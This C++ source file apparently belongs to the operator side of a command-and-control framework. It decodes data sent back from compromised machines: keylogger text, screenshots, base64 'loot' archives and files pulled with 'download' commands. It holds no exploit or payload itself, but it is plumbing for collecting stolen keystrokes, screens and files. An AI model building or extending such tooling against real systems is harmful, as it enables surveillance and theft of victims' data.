#include "ResultDecoders.hpp"

#include <filesystem>

namespace fs = std::filesystem;

DecodedArtifact TextDecoder::decode(const ResultDAO& result, const std::string&) const {
    DecodedArtifact artifact;
    artifact.kind = exfil::ExfilKind::Text;
    artifact.text = result.data;
    artifact.success = result.status != exfil::kStatusFailed;
    return artifact;
}

DecodedArtifact LootDecoder::decode(const ResultDAO& result, const std::string&) const {
    DecodedArtifact artifact;
    artifact.kind = exfil::ExfilKind::Loot;

    if (result.data.empty()) {
        artifact.success = false;
        artifact.error = "Empty loot payload";
        return artifact;
    }

    if (auto files = loot_archive::decode_base64_archive(result.data)) {
        artifact.loot_files = std::move(*files);
        artifact.success = true;
        return artifact;
    }

    artifact.success = false;
    artifact.error = "Failed to decode loot archive";
    return artifact;
}

DecodedArtifact KeyloggerDecoder::decode(const ResultDAO& result, const std::string&) const {
    DecodedArtifact artifact;
    artifact.kind = exfil::ExfilKind::Keylogger;
    artifact.text = result.data;
    artifact.success = true;
    return artifact;
}

DecodedArtifact ScreenshotDecoder::decode(const ResultDAO& result, const std::string&) const {
    DecodedArtifact artifact;
    artifact.kind = exfil::ExfilKind::Screenshot;

    if (auto bytes = loot_archive::decode_base64(result.data)) {
        artifact.bytes = std::move(*bytes);
        artifact.success = true;
        return artifact;
    }

    artifact.success = false;
    artifact.error = result.data;
    return artifact;
}

DecodedArtifact FileDecoder::decode(const ResultDAO& result, const std::string& command_text) const {
    DecodedArtifact artifact;
    artifact.kind = exfil::ExfilKind::File;

    if (result.data.starts_with("ERROR:")) {
        artifact.success = false;
        artifact.error = result.data;
        return artifact;
    }

    if (auto bytes = loot_archive::decode_base64(result.data)) {
        artifact.bytes = std::move(*bytes);
        artifact.success = true;

        constexpr std::string_view prefix = "download ";
        if (command_text.starts_with(prefix)) {
            const auto path = command_text.substr(prefix.size());
            artifact.suggested_filename = fs::path(path).filename().string();
        }
        if (artifact.suggested_filename.empty()) {
            artifact.suggested_filename = "download.bin";
        }
        return artifact;
    }

    artifact.success = false;
    artifact.error = "Failed to decode file payload";
    return artifact;
}

DecodedArtifact ResultDecoderRegistry::decode(const ResultDAO& result, const std::string& command_text) const {
    const auto kind = exfil::kind_from_string(result.kind);
    switch (kind) {
    case exfil::ExfilKind::Loot: return loot_.decode(result, command_text);
    case exfil::ExfilKind::Keylogger: return keylogger_.decode(result, command_text);
    case exfil::ExfilKind::Screenshot: return screenshot_.decode(result, command_text);
    case exfil::ExfilKind::File: return file_.decode(result, command_text);
    case exfil::ExfilKind::Text:
    default: return text_.decode(result, command_text);
    }
}
